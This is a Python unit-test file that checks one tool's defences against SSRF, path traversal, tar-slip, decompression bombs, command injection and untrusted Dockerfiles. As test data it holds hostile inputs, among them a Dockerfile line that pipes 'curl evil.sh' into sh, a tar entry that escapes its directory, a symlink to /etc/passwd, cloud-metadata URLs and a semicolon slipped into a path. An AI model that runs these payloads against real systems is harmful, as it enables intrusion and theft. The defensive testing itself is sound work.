"""Unit tests for Phase 1 P0 security & data-safety hardening."""

from __future__ import annotations

import gzip
import io
import json
import socket
import sys
import tarfile
from pathlib import Path

import httpx
import pytest

from researchability.connectors.arxiv import _extract_latex_from_bytes
from researchability.connectors.base import RetryTransport, UnsafeUrlError, create_safe_http_client
from researchability.connectors.dataverse import DataverseConnector
from researchability.connectors.links import (
    classify_url,
    is_safe_public_url,
    safe_resolve_under,
)
from researchability.connectors.resolver import ArtifactResolver
from researchability.gates.stage4_execution import _resolve_script_relpath
from researchability.models import (
    ArtifactLink,
    ArtifactStatus,
    AuditReport,
    DomainScore,
    FieldProfile,
    GateResult,
    GateStatus,
    PaperBundle,
    ProblemDomain,
)
from researchability.sandbox.docker_runner import (
    CommandResult,
    DockerSandboxRunner,
    SandboxConfig,
    default_subprocess_runner,
)
from researchability.storage.store import ResearchabilityStore


def test_classify_url_rejects_subdomain_and_substring_spoofing() -> None:
    assert classify_url("https://github.com/org/repo") == ("github", "code")
    assert classify_url("https://gist.github.com/user/123") == ("github", "code")
    assert classify_url("https://evil.com/?next=https://github.com/a/b") == ("other", "other")
    assert classify_url("https://notgithub.com/org/repo") == ("other", "other")
    assert classify_url("https://github.com.attacker.tld/repo") == ("other", "other")


def test_is_safe_public_url_blocks_internal_and_non_http() -> None:
    assert is_safe_public_url("https://github.com/org/repo") is True
    assert is_safe_public_url("http://127.0.0.1:8080/admin") is False
    assert is_safe_public_url("http://169.254.169.254/latest/meta-data/") is False
    assert is_safe_public_url("http://10.0.0.5/internal") is False
    assert is_safe_public_url("http://[::ffff:127.0.0.1]/") is False
    assert is_safe_public_url("http://localhost:8000/secret") is False
    assert is_safe_public_url("http://service.internal/api") is False
    assert is_safe_public_url("file:///etc/passwd") is False


def test_resolver_blocks_ssrf_urls_without_network_call() -> None:
    called = False

    def handler(request: httpx.Request) -> httpx.Response:
        nonlocal called
        called = True
        return httpx.Response(200)

    client = httpx.Client(transport=httpx.MockTransport(handler))
    resolver = ArtifactResolver(http_client=client)
    bad_link = ArtifactLink(url="http://169.254.169.254/latest/meta-data/", host="other")
    resolved, *_ = resolver.resolve_link(bad_link)
    assert resolved.status == ArtifactStatus.UNRESOLVED
    assert not called


def test_safe_resolve_under_blocks_traversal_and_symlinks(tmp_path: Path) -> None:
    root = tmp_path / "root"
    root.mkdir()
    outside = tmp_path / "outside.txt"
    outside.write_text("secret", encoding="utf-8")

    assert safe_resolve_under(root, "sub/file.txt") == (root / "sub" / "file.txt").resolve()
    assert safe_resolve_under(root, "../outside.txt") is None
    assert safe_resolve_under(root, "/etc/passwd") is None

    sym = root / "link.txt"
    sym.symlink_to(outside)
    assert safe_resolve_under(root, "link.txt") is None


def test_dataverse_download_blocks_traversal_and_enforces_streaming_cap(tmp_path: Path) -> None:
    payload = {
        "status": "OK",
        "data": {
            "latestVersion": {
                "metadataBlocks": {"citation": {"fields": []}},
                "files": [
                    {
                        "directoryLabel": "../../outside",
                        "dataFile": {"id": 1, "filename": "pwn.txt", "filesize": 10},
                    },
                    {
                        "directoryLabel": "safe",
                        "dataFile": {"id": 2, "filename": "big.bin", "filesize": 10},
                    },
                ],
            }
        },
    }

    def handler(request: httpx.Request) -> httpx.Response:
        if "/api/datasets/:persistentId/" in str(request.url):
            return httpx.Response(200, json=payload)
        if "/api/access/datafile/2" in str(request.url):
            return httpx.Response(200, content=b"A" * 500)
        return httpx.Response(404)

    connector = DataverseConnector(http_client=httpx.Client(transport=httpx.MockTransport(handler)))
    out_dir = tmp_path / "dv"
    bundle = connector.fetch_dataset(
        "doi:10.7910/DVN/TEST",
        workdir=out_dir,
        max_total_bytes=100,
    )
    assert not (tmp_path / "outside" / "pwn.txt").exists()
    # Streaming byte cap aborts once chunks exceed 100 bytes
    assert not (out_dir / "safe" / "big.bin").exists()
    assert "safe/big.bin" not in bundle.artifacts.data_files


def test_arxiv_latex_extraction_blocks_tarslip_symlinks_and_bomb(tmp_path: Path) -> None:
    tar_buf = io.BytesIO()
    with tarfile.open(fileobj=tar_buf, mode="w:gz") as tf:
        bad = tarfile.TarInfo("../escape.tex")
        bad.size = 4
        tf.addfile(bad, io.BytesIO(b"evil"))

        sym = tarfile.TarInfo("sym.tex")
        sym.type = tarfile.SYMTYPE
        sym.linkname = "/etc/passwd"
        tf.addfile(sym)

        dot = tarfile.TarInfo(".git/config")
        dot.size = 4
        tf.addfile(dot, io.BytesIO(b"evil"))

        good = tarfile.TarInfo("sections/intro.tex")
        good.size = 11
        tf.addfile(good, io.BytesIO(b"Hello LaTeX"))

    out_dir = tmp_path / "tex"
    tex_text, _tables = _extract_latex_from_bytes(tar_buf.getvalue(), target_dir=out_dir)
    assert "Hello LaTeX" in tex_text
    assert not (tmp_path / "escape.tex").exists()
    assert not (out_dir / "sym.tex").exists()
    assert not (out_dir / ".git" / "config").exists()
    assert (out_dir / "sections" / "intro.tex").is_file()

    # Oversized single gzip stream is rejected/bounded
    huge_gz = gzip.compress(b"x" * 2_000)
    bounded_text, _ = _extract_latex_from_bytes(huge_gz, max_extracted_bytes=512)
    assert len(bounded_text) <= 512


def test_docker_runner_ignores_untrusted_dockerfile_by_default_and_hardens_flags(
    tmp_path: Path,
) -> None:
    (tmp_path / "Dockerfile").write_text("FROM alpine\nRUN curl evil.sh | sh\n", encoding="utf-8")
    (tmp_path / "requirements.txt").write_text("numpy==1.26.4\n", encoding="utf-8")
    (tmp_path / "main.py").write_text("print(1)\n", encoding="utf-8")
    paper = PaperBundle(paper_id="p1", source_repo="test", title="Test")

    commands: list[list[str]] = []

    def runner(args: list[str], *, cwd: Path | None = None, timeout: int = 300) -> CommandResult:
        commands.append(args)
        return CommandResult(returncode=0, stdout="ok", command=args)

    default_sb = DockerSandboxRunner(runner=runner)
    build_default = default_sb.build_environment(paper, tmp_path)
    assert build_default.dockerfile_used == ".researchability_sandbox/Dockerfile.generated"

    opt_in_sb = DockerSandboxRunner(SandboxConfig(allow_repo_dockerfile=True), runner=runner)
    build_opt_in = opt_in_sb.build_environment(paper, tmp_path)
    assert build_opt_in.dockerfile_used == "Dockerfile"

    run_args = default_sb.build_run_args("img:1", ["python", "main.py"], tmp_path)
    assert "--pids-limit=256" in run_args
    assert "--ipc=none" in run_args
    assert "--ulimit=nofile=1024:1024" in run_args

    # Subprocess output stream capping works without loading unbounded stdout
    bounded = default_subprocess_runner(
        [sys.executable, "-c", "print('A' * 120000)"],
        timeout=10,
    )
    assert bounded.returncode == 0
    assert len(bounded.stdout) == 50_000


def test_docker_manifest_quoting_and_script_relpath_containment(tmp_path: Path) -> None:
    evil_dir = tmp_path / "dir with spaces;evil"
    evil_dir.mkdir()
    (evil_dir / "requirements.txt").write_text("numpy\n", encoding="utf-8")
    runner = DockerSandboxRunner()
    paper = PaperBundle(paper_id="p2", source_repo="test", title="Test")
    df = runner.render_dockerfile(paper, tmp_path)
    # shlex.quote wraps path containing spaces and semicolon in single quotes
    assert "'dir with spaces;evil/requirements.txt'" in df

    # Outside symlink script is rejected
    outside = tmp_path.parent / f"{tmp_path.name}_outside.py"
    outside.write_text("print('x')\n", encoding="utf-8")
    (tmp_path / "escape.py").symlink_to(outside)
    assert _resolve_script_relpath(tmp_path, "../escape.py") is None
    assert _resolve_script_relpath(tmp_path, "escape.py") is None


def test_atomic_parquet_export_preserves_prior_on_failure(tmp_path: Path) -> None:
    db_path = tmp_path / "db.duckdb"
    store = ResearchabilityStore(db_path)
    report = AuditReport(
        paper_id="p_atomic",
        source_repo="test",
        profile=FieldProfile.ML_CS,
        composite_score=0.8,
        funnel_depth=5,
        domain_scores={
            ProblemDomain.TRIAGE: DomainScore(
                domain=ProblemDomain.TRIAGE,
                passed=1,
                weighted_passed=1.0,
                weighted_total=1.0,
                pass_rate=1.0,
                weighted_pass_rate=1.0,
            )
        },
        gate_results=[
            GateResult(
                gate_id="G0.1_TEXT_ACCESSIBLE",
                stage=0,
                domain=ProblemDomain.TRIAGE,
                status=GateStatus.PASS,
            )
        ],
    )
    paper = PaperBundle(
        paper_id="p_atomic",
        source_repo="test",
        title="Atomic Test",
        primary_profile=FieldProfile.ML_CS,
    )
    store.save_audit(paper, report)
    parquet_root = tmp_path / "parquet"
    exports = store.export_parquet(parquet_root)
    assert list(exports["papers"].rglob("*.parquet"))
    existing_marker = exports["papers"] / "marker.txt"
    existing_marker.write_text(json.dumps({"keep": True}), encoding="utf-8")

    # Simulate DuckDB COPY failure mid-export
    original_connect = store._connect

    class FailingConn:
        def __init__(self, inner: object) -> None:
            self._inner = inner
            self._conn: object = None

        def __enter__(self) -> FailingConn:
            self._conn = self._inner.__enter__()  # type: ignore[attr-defined]
            return self

        def __exit__(self, *args: object) -> None:
            self._inner.__exit__(*args)  # type: ignore[attr-defined]

        def execute(self, sql: str, params: object = None) -> object:
            if sql.startswith("COPY "):
                raise RuntimeError("simulated disk full")
            if params is not None:
                return self._conn.execute(sql, params)  # type: ignore[attr-defined]
            return self._conn.execute(sql)  # type: ignore[attr-defined]

    store._connect = lambda: FailingConn(original_connect())  # type: ignore[method-assign,assignment]
    with pytest.raises(RuntimeError, match="simulated disk full"):
        store.export_parquet(parquet_root)

    # Prior parquet export directory and marker were preserved atomically
    assert existing_marker.exists()
    assert not any(p.name.startswith(".staging_") for p in parquet_root.iterdir())


def test_is_safe_public_url_blocks_private_dns_resolution(monkeypatch: pytest.MonkeyPatch) -> None:
    def fake_getaddrinfo(
        host: str,
        port: object,
        family: int = 0,
        type: int = 0,
        proto: int = 0,
        flags: int = 0,
    ) -> list[tuple[object, ...]]:
        if host == "rebind.example.org":
            return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("127.0.0.1", 80))]
        if host == "public.example.org":
            return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443))]
        raise socket.gaierror("unresolvable")

    monkeypatch.setattr(socket, "getaddrinfo", fake_getaddrinfo)
    assert is_safe_public_url("https://rebind.example.org/data", resolve_dns=True) is False
    assert is_safe_public_url("https://public.example.org/data", resolve_dns=True) is True


def test_resolver_and_transport_block_unsafe_redirect_hops(monkeypatch: pytest.MonkeyPatch) -> None:
    # 1. Resolver inspects redirect history and blocks internal redirect targets
    def redirect_handler(request: httpx.Request) -> httpx.Response:
        if str(request.url) == "https://public.example.org/start":
            return httpx.Response(
                302,
                headers={"Location": "http://169.254.169.254/latest/meta-data/"},
            )
        return httpx.Response(200, text="secret")

    client = httpx.Client(transport=httpx.MockTransport(redirect_handler), follow_redirects=True)
    resolver = ArtifactResolver(http_client=client)
    link = ArtifactLink(url="https://public.example.org/start", host="other")
    resolved, *_ = resolver.resolve_link(link)
    assert resolved.status == ArtifactStatus.UNRESOLVED
    assert resolved.metadata.get("blocked_reason") == "unsafe_redirect_target"

    # 2. RetryTransport with enforce_public_urls aborts before invoking inner transport on bad hop
    calls: list[str] = []

    def inner_handler(request: httpx.Request) -> httpx.Response:
        calls.append(str(request.url))
        return httpx.Response(302, headers={"Location": "http://10.0.0.1/internal"})

    safe_transport = RetryTransport(
        httpx.MockTransport(inner_handler),
        max_retries=0,
        enforce_public_urls=True,
        resolve_dns=False,
    )
    with (
        httpx.Client(transport=safe_transport, follow_redirects=True) as guarded_client,
        pytest.raises(UnsafeUrlError),
    ):
        guarded_client.get("https://public.example.org/jump")
    assert calls == ["https://public.example.org/jump"]

    # 3. create_safe_http_client rejects private DNS before socket connection
    monkeypatch.setattr(
        socket,
        "getaddrinfo",
        lambda *_a, **_kw: [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("169.254.169.254", 80))],
    )
    with create_safe_http_client(timeout=2.0) as safe_client, pytest.raises(UnsafeUrlError):
        safe_client.get("https://evil-alias.example.org/secret")
